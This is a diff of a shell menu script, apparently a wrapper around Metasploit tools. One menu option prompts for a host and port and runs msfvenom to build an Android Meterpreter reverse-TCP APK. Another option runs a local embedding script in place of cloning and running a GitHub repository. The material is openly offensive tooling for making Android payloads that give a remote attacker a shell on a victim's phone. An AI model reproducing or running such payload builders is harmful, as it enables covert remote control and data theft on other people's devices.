@@ -15,14 +15,12 @@ then
 break
 elif [ $o = "1" ]
 then
-cd $HOME
-git clone https://github.com/SathvikKS/T-Load.git
-cd T-Load
-chmod +x setup.sh
-./setup.sh
-./run.sh
+cd T-Embed
+./tembed.sh
 elif [ $o = "2" ]
 then
+metapath="$HOME/metasploit-framework"
+cd $metapath
 echo "Enter HOST"
 read -p ">|" host1
 echo "Enter PORT"
@@ -31,6 +29,7 @@ echo "Please enter the complete path with .apk extension"
 echo "where you want to save the payload to"
 read -p ">|" p2
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
+cd ..
 elif [ $o = "4" ]
 then
 exit
